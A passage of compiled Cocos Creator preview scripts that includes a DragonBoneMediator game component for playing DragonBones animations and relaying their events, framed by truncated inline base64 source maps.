gcGFyZW50XHJcbiAgICAgKiBAcGFyYW0ge2NjLlZlYzJ9IHN0YXJ0UG9zXHJcbiAgICAgKiBAcGFyYW0ge2NjLlZlYzJ9IGVuZFBvc1xyXG4gICAgICogQHBhcmFtIHtudW1iZXJ9IHJhZGl1c1xyXG4gICAgICogQHBhcmFtIHtudW1iZXJ9IG51bVxyXG4gICAgICogQHBhcmFtIHtudW1iZXJ9IG1vdmVTcGVlZFxyXG4gICAgICovXHJcbiAgICBzdGF0aWMgYm9vbShjcmVhdGVOb2RlOigpPT5jYy5Ob2RlLCBzdGFydFBvczpjYy5WZWMyLCBlbmRQb3M6Y2MuVmVjMiwgcmFkaXVzOm51bWJlciwgbnVtOm51bWJlciwgbW92ZVNwZWVkOm51bWJlciA9IDIwMDAsIGNhbGxiYWNrPzooKT0+dm9pZCl7XHJcbiAgICAgICAgbGV0IGxpc3Q6W2NjLk5vZGVdID0gW107XHJcbiAgICAgICAgbGV0IHByb21pc2UgPSBbXTtcclxuICAgICAgICBmb3IgKGxldCBpPTA7IGk8bnVtOyBpKyspe1xyXG4gICAgICAgICAgICBwcm9taXNlLnB1c2gobmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICAgICAgbGV0IG5vZGUgPSBjcmVhdGVOb2RlKCk7XHJcbiAgICAgICAgICAgICAgICBub2RlLnBvc2l0aW9uID0gc3RhcnRQb3M7XHJcbiAgICAgICAgICAgICAgICBsaXN0LnB1c2gobm9kZSk7XHJcbiAgICAgICAgICAgICAgICAvKiog54K45byA5Yqo5L2cICovXHJcbiAgICAgICAgICAgICAgICBsZXQgYW5nbGUgPSBpKjM2MC9udW0tNDU7XHJcbiAgICAgICAgICAgICAgICAvLyBub2RlLnJvdGF0aW9uID0gNDUrYW5nbGU7XHJcbiAgICAgICAgICAgICAgICAvKiog6K6h566X5ZCR6YePICovXHJcbiAgICAgICAgICAgICAgICBsZXQgbm9ybWFsID0gY2MudjIoMSwgMSkucm90YXRlU2VsZigtYW5nbGUqTWF0aC5QSS8xODApO1xyXG4gICAgICAgICAgICAgICAgbGV0IHBvc2l0aW9uID0gbm9ybWFsLm11bChyYWRpdXMpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGJvb21TcGVlZCA9IDUwMDtcclxuICAgICAgICAgICAgICAgIG5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVCeShyYWRpdXMvYm9vbVNwZWVkLCBwb3NpdGlvbikuZWFzaW5nKGNjLmVhc2VFeHBvbmVudGlhbE91dCgpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAvKiog56e75YqoICovXHJcbiAgICAgICAgICAgICAgICAgICAgcmVzb2x2ZSgpO1xyXG4gICAgICAgICAgICAgICAgfSkpKTtcclxuXHJcbiAgICAgICAgICAgICAgICAvLyBub2RlLnJ1bkFjdGlvbihjYy5yZXBlYXRGb3JldmVyKEFjdGlvbnMuZmxpcFhBY3Rpb24oaSUyPT0wPzE6MC45KSkpO1xyXG4gICAgICAgICAgICAgICAgLy8gbm9kZS5nZXRDb21wb25lbnQoY2MuQW5pbWF0aW9uKS5wbGF5KG51bGwsIGklMj09MD8wOjAuMik7XHJcbiAgICAgICAgICAgIH0pKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgUHJvbWlzZS5hbGwocHJvbWlzZSkudGhlbihyZXM9PntcclxuICAgICAgICAgICAgLyoqIOWIhuaIkOS4pOmDqOWIhiAqL1xyXG4gICAgICAgICAgICBsZXQgaGFsZk51bSA9IE1hdGguZmxvb3IobnVtLzIpO1xyXG4gICAgICAgICAgICBmb3IgKGxldCBpPTA7IGk8aGFsZk51bTsgaSsrKXtcclxuICAgICAgICAgICAgICAgIGxldCBub2RlID0gbGlzdFtpXTtcclxuICAgICAgICAgICAgICAgIGxldCBzdWIgPSBlbmRQb3Muc3ViKG5vZGUucG9zaXRpb24pO1xyXG4gICAgICAgICAgICAgICAgbGV0IG1vdmVUaW1lID0gc3ViLm1hZygpL21vdmVTcGVlZDtcclxuICAgICAgICAgICAgICAgIGxldCBjZW50ZXIgPSBub2RlLnBvc2l0aW9uLmFkZChzdWIubXVsKDAuNSkpO1xyXG4gICAgICAgICAgICAgICAgbGV0IHAgPSBzdWIubm9ybWFsaXplKCkucm90YXRlKC05MCpNYXRoLlBJLzE4MCk7XHJcbiAgICAgICAgICAgICAgICBsZXQgdG9BY3Rpb24gPSBjYy5iZXppZXJUbyhtb3ZlVGltZSwgW1xyXG4gICAgICAgICAgICAgICAgICAgIGNlbnRlci5hZGQocC5tdWwoMjAwKSksXHJcbiAgICAgICAgICAgICAgICAgICAgZW5kUG9zLFxyXG4gICAgICAgICAgICAgICAgICAgIGVuZFBvc1xyXG4gICAgICAgICAgICAgICAgXSk7XHJcblxyXG4gICAgICAgICAgICAgICAgbm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKGkqMC4wOCksIGNjLnNwYXduKHRvQWN0aW9uLmVhc2luZyhjYy5lYXNlU2luZU91dCgpKSwgY2Muc2NhbGVUbyhtb3ZlVGltZSwgMC41KSwgY2MuZmFkZVRvKG1vdmVUaW1lLCA4MCkpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBmb3IgKGxldCBpPTA7IGk8bGlzdC5sZW5ndGgtaGFsZk51bTsgaSsrKXtcclxuICAgICAgICAgICAgICAgIGxldCBub2RlID0gbGlzdFtsaXN0Lmxlbmd0aC0xLWldO1xyXG4gICAgICAgICAgICAgICAgbGV0IHN1YiA9IGVuZFBvcy5zdWIobm9kZS5wb3NpdGlvbik7XHJcbiAgICAgICAgICAgICAgICBsZXQgbW92ZVRpbWUgPSBzdWIubWFnKCkvbW92ZVNwZWVkO1xyXG4gICAgICAgICAgICAgICAgbGV0IGNlbnRlciA9IG5vZGUucG9zaXRpb24uYWRkKHN1Yi5tdWwoMC41KSk7XHJcbiAgICAgICAgICAgICAgICBsZXQgcCA9IHN1Yi5ub3JtYWxpemUoKS5yb3RhdGUoLTkwKk1hdGguUEkvMTgwKTtcclxuICAgICAgICAgICAgICAgIGxldCB0b0FjdGlvbiA9IGNjLmJlemllclRvKG1vdmVUaW1lLCBbXHJcbiAgICAgICAgICAgICAgICAgICAgY2VudGVyLmFkZChwLm11bCgtMjAwKSksXHJcbiAgICAgICAgICAgICAgICAgICAgZW5kUG9zLFxyXG4gICAgICAgICAgICAgICAgICAgIGVuZFBvc1xyXG4gICAgICAgICAgICAgICAgXSk7XHJcblxyXG4gICAgICAgICAgICAgICAgbm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKGkqMC4wOCksIGNjLnNwYXduKHRvQWN0aW9uLmVhc2luZyhjYy5lYXNlU2luZU91dCgpKSwgY2Muc2NhbGVUbyhtb3ZlVGltZSwgMC41KSwgY2MuZmFkZVRvKG1vdmVUaW1lLCA4MCkpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgICAgIG5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxufVxyXG5cclxuXHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/component/DragonBoneMediator.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '9a7acgYw3ZIX7xQplxXQaEU', 'DragonBoneMediator');
// framework/component/DragonBoneMediator.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu, requireComponent = _a.requireComponent;
var DragonBonesEventType;
(function (DragonBonesEventType) {
    DragonBonesEventType[DragonBonesEventType["START"] = 0] = "START";
    DragonBonesEventType[DragonBonesEventType["LOOP_COMPLETE"] = 1] = "LOOP_COMPLETE";
    DragonBonesEventType[DragonBonesEventType["COMPLETE"] = 2] = "COMPLETE";
    DragonBonesEventType[DragonBonesEventType["FADE_IN"] = 3] = "FADE_IN";
    DragonBonesEventType[DragonBonesEventType["FADE_IN_COMPLETE"] = 4] = "FADE_IN_COMPLETE";
    DragonBonesEventType[DragonBonesEventType["FADE_OUT"] = 5] = "FADE_OUT";
    DragonBonesEventType[DragonBonesEventType["FADE_OUT_COMPLETE"] = 6] = "FADE_OUT_COMPLETE";
    DragonBonesEventType[DragonBonesEventType["FRAME_EVENT"] = 7] = "FRAME_EVENT";
    DragonBonesEventType[DragonBonesEventType["SOUND_EVENT"] = 8] = "SOUND_EVENT";
})(DragonBonesEventType || (DragonBonesEventType = {}));
var map = new Map();
map.set(DragonBonesEventType.START, dragonBones.EventObject.START);
map.set(DragonBonesEventType.LOOP_COMPLETE, dragonBones.EventObject.LOOP_COMPLETE);
map.set(DragonBonesEventType.COMPLETE, dragonBones.EventObject.COMPLETE);
map.set(DragonBonesEventType.FADE_IN, dragonBones.EventObject.FADE_IN);
map.set(DragonBonesEventType.FADE_IN_COMPLETE, dragonBones.EventObject.FADE_IN_COMPLETE);
map.set(DragonBonesEventType.FADE_OUT, dragonBones.EventObject.FADE_OUT);
map.set(DragonBonesEventType.FADE_OUT_COMPLETE, dragonBones.EventObject.FADE_OUT_COMPLETE);
map.set(DragonBonesEventType.FRAME_EVENT, dragonBones.EventObject.FRAME_EVENT);
map.set(DragonBonesEventType.SOUND_EVENT, dragonBones.EventObject.SOUND_EVENT);
var DragonBoneMediator = /** @class */ (function (_super) {
    __extends(DragonBoneMediator, _super);
    function DragonBoneMediator() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.armatureDisplay = null;
        _this.animationState = null;
        _this.armatureName = "Armature";
        _this.eventType = DragonBonesEventType.COMPLETE;
        _this.eventHandlers = [];
        return _this;
    }
    DragonBoneMediator.prototype.onLoad = function () {
        this.armatureDisplay = this.getComponent(dragonBones.ArmatureDisplay);
    };
    DragonBoneMediator.prototype._playAnim = function (name, playTimes, timeScale) {
        if (playTimes === void 0) { playTimes = 0; }
        if (timeScale === void 0) { timeScale = 1; }
        this.armatureDisplay.timeScale = timeScale;
        this.armatureDisplay.armatureName = this.armatureName;
        this.animationState = this.armatureDisplay.playAnimation(name, playTimes);
        console.log("playAnim===>name=" + this.animationState.name + " playTimes=" + playTimes + " timeScale=" + timeScale);
    };
    DragonBoneMediator.prototype.playAnim = function (name, timeScale) {
        this._playAnim(name, 0, timeScale);
    };
    DragonBoneMediator.prototype.playAnimOnce = function (name, timeScale) {
        this._playAnim(name, 1, timeScale);
    };
    DragonBoneMediator.prototype.isAnim = function (name) {
        if (this.animationState == null)
            return false;
        return this.animationState.name === name;
    };
    /** 更换slot.display */
    DragonBoneMediator.prototype.replaceSlotDisplay = function (slotName, spriteFrame) {
        // this.armatureDisplay.armature().getSlot(slotName).display = new cc.Scale9Sprite(spriteFrame);
        // this.armatureDisplay.armature().getSlot(slotName).display = spriteFrame;
        if (typeof spriteFrame == "number") {
            this.armatureDisplay.armature().getSlot(slotName).displayIndex = spriteFrame;
        }
    };
    /**获取骨骼bone的坐标*/
    DragonBoneMediator.prototype.getBoneWorldPosition = function (boneName) {
        var bone = this.armatureDisplay.armature().getBone(boneName);
        return this.node.convertToWorldSpaceAR(cc.v2(bone.global.x, -bone.global.y));
    };
    DragonBoneMediator.prototype.initDragonBone = function (dragonAsset, dragonAtlasAsset, armatureName) {
        if (!dragonAsset || !dragonAtlasAsset) {
            throw Error("dragonAsset=" + dragonAsset + " dragonAtlasAsset=" + dragonAtlasAsset);
        }
        this.node.removeComponent(dragonBones.ArmatureDisplay);
        var armatureDisplay = this.node.addComponent(dragonBones.ArmatureDisplay);
        armatureDisplay.dragonAsset = dragonAsset;
        armatureDisplay.dragonAtlasAsset = dragonAtlasAsset;
        armatureDisplay.armatureName = armatureName || this.armatureName;
        this.animationState = null;
        this.armatureDisplay = armatureDisplay;
    };
    DragonBoneMediator.prototype.handleEvent = function (event) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                cc.Component.EventHandler.emitEvents(this.eventHandlers, event);
                return [2 /*return*/];
            });
        });
    };
    DragonBoneMediator.prototype.onLoad = function () {
        this.armatureDisplay.addEventListener(map.get(this.eventType), this.handleEvent, this);
    };
    DragonBoneMediator.prototype.onDestroy = function () {
        this.armatureDisplay.removeEventListener(map.get(this.eventType), this.handleEvent, this);
    };
    __decorate([
        property
    ], DragonBoneMediator.prototype, "armatureName", void 0);
    __decorate([
        property({ type: cc.Enum(DragonBonesEventType) })
    ], DragonBoneMediator.prototype, "eventType", void 0);
    __decorate([
        property({ type: cc.Component.EventHandler, displayName: "触发事件" })
    ], DragonBoneMediator.prototype, "eventHandlers", void 0);
    DragonBoneMediator = __decorate([
        ccclass,
        menu("自定义/DragonBoneMediator"),
        requireComponent(dragonBones.ArmatureDisplay)
    ], DragonBoneMediator);
    return DragonBoneMediator;
}(cc.Component));
exports.default = DragonBoneMediator;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29tcG9uZW50L0RyYWdvbkJvbmVNZWRpYXRvci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7QUFBQSxvQkFBb0I7QUFDcEIsaUZBQWlGO0FBQ2pGLHlGQUF5RjtBQUN6RixtQkFBbUI7QUFDbkIsMkZBQTJGO0FBQzNGLG1HQUFtRztBQUNuRyw4QkFBOEI7QUFDOUIsMkZBQTJGO0FBQzNGLG1HQUFtRzs7QUFLN0YsSUFBQSxLQUE4QyxFQUFFLENBQUMsVUFBVSxFQUExRCxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQUEsRUFBRSxJQUFJLFVBQUEsRUFBRSxnQkFBZ0Isc0JBQWlCLENBQUM7QUFFbEUsSUFBSyxvQkFVSjtBQVZELFdBQUssb0JBQW9CO0lBQ3JCLGlFQUFLLENBQUE7SUFDTCxpRkFBYSxDQUFBO0lBQ2IsdUVBQVEsQ0FBQTtJQUNSLHFFQUFPLENBQUE7SUFDUCx1RkFBZ0IsQ0FBQTtJQUNoQix1RUFBUSxDQUFBO0lBQ1IseUZBQWlCLENBQUE7SUFDakIsNkVBQVcsQ0FBQTtJQUNYLDZFQUFXLENBQUE7QUFDZixDQUFDLEVBVkksb0JBQW9CLEtBQXBCLG9CQUFvQixRQVV4QjtBQUdELElBQUksR0FBRyxHQUFHLElBQUksR0FBRyxFQUFnQyxDQUFDO0FBQ2xELEdBQUcsQ0FBQyxHQUFHLENBQUMsb0JBQW9CLENBQUMsS0FBSyxFQUFFLFdBQVcsQ0FBQyxXQUFXLENBQUMsS0FBSyxDQUFDLENBQUM7QUFDbkUsR0FBRyxDQUFDLEdBQUcsQ0FBQyxvQkFBb0IsQ0FBQyxhQUFhLEVBQUUsV0FBVyxDQUFDLFdBQVcsQ0FBQyxhQUFhLENBQUMsQ0FBQztBQUNuRixHQUFHLENBQUMsR0FBRyxDQUFDLG9CQUFvQixDQUFDLFFBQVEsRUFBRSxXQUFXLENBQUMsV0FBVyxDQUFDLFFBQVEsQ0FBQyxDQUFDO0FBQ3pFLEdBQUcsQ0FBQyxHQUFHLENBQUMsb0JBQW9CLENBQUMsT0FBTyxFQUFFLFdBQVcs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QUksQ0FBQyxXQUFXLEVBQUUsSUFBSSxDQUFDLENBQUM7SUFDM0YsQ0FBQztJQUVELHNDQUFTLEdBQVQ7UUFDSSxJQUFJLENBQUMsZUFBZSxDQUFDLG1CQUFtQixDQUFDLEdBQUcsQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLElBQUksQ0FBQyxXQUFXLEVBQUUsSUFBSSxDQUFDLENBQUM7SUFDOUYsQ0FBQztJQXZFRDtRQURDLFFBQVE7NERBQ3dCO0lBR2pDO1FBREMsUUFBUSxDQUFDLEVBQUMsSUFBSSxFQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsb0JBQW9CLENBQUMsRUFBQyxDQUFDO3lEQUNnQjtJQUcvRDtRQURDLFFBQVEsQ0FBQyxFQUFDLElBQUksRUFBQyxFQUFFLENBQUMsU0FBUyxDQUFDLFlBQVksRUFBRSxXQUFXLEVBQUMsTUFBTSxFQUFDLENBQUM7NkRBQ2hCO0lBYjlCLGtCQUFrQjtRQUh0QyxPQUFPO1FBQ1AsSUFBSSxDQUFDLHdCQUF3QixDQUFDO1FBQzlCLGdCQUFnQixDQUFDLFdBQVcsQ0FBQyxlQUFlLENBQUM7T0FDekIsa0JBQWtCLENBZ0Z0QztJQUFELHlCQUFDO0NBaEZELEFBZ0ZDLENBaEYrQyxFQUFFLENBQUMsU0FBUyxHQWdGM0Q7a0JBaEZvQixrQkFBa0IiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcblxyXG5cclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eSwgbWVudSwgcmVxdWlyZUNvbXBvbmVudH0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuZW51bSBEcmFnb25Cb25lc0V2ZW50VHlwZXtcclxuICAgIFNUQVJULFxyXG4gICAgTE9PUF9DT01QTEVURSxcclxuICAgIENPTVBMRVRFLFxyXG4gICAgRkFERV9JTixcclxuICAgIEZBREVfSU5fQ09NUExFVEUsXHJcbiAgICBGQURFX09VVCxcclxuICAgIEZBREVfT1VUX0NPTVBMRVRFLFxyXG4gICAgRlJBTUVfRVZFTlQsXHJcbiAgICBTT1VORF9FVkVOVCxcclxufVxyXG5cclxuXHJcbmxldCBtYXAgPSBuZXcgTWFwPERyYWdvbkJvbmVzRXZlbnRUeXBlLCBzdHJpbmc+KCk7XHJcbm1hcC5zZXQoRHJhZ29uQm9uZXNFdmVudFR5cGUuU1RBUlQsIGRyYWdvbkJvbmVzLkV2ZW50T2JqZWN0LlNUQVJUKTtcclxubWFwLnNldChEcmFnb25Cb25lc0V2ZW50VHlwZS5MT09QX0NPTVBMRVRFLCBkcmFnb25Cb25lcy5FdmVudE9iamVjdC5MT09QX0NPTVBMRVRFKTtcclxubWFwLnNldChEcmFnb25Cb25lc0V2ZW50VHlwZS5DT01QTEVURSwgZHJhZ29uQm9uZXMuRXZlbnRPYmplY3QuQ09NUExFVEUpO1xyXG5tYXAuc2V0KERyYWdvbkJvbmVzRXZlbnRUeXBlLkZBREVfSU4sIGRyYWdvbkJvbmVzLkV2ZW50T2JqZWN0LkZBREVfSU4pO1xyXG5tYXAuc2V0KERyYWdvbkJvbmVzRXZlbnRUeXBlLkZBREVfSU5fQ09NUExFVEUsIGRyYWdvbkJvbmVzLkV2ZW50T2JqZWN0LkZBREVfSU5fQ09NUExFVEUpO1xyXG5tYXAuc2V0KERyYWdvbkJvbmVzRXZlbnRUeXBlLkZBREVfT1VULCBkcmFnb25Cb25lcy5FdmVudE9iamVjdC5GQURFX09VVCk7XHJcbm1hcC5zZXQoRH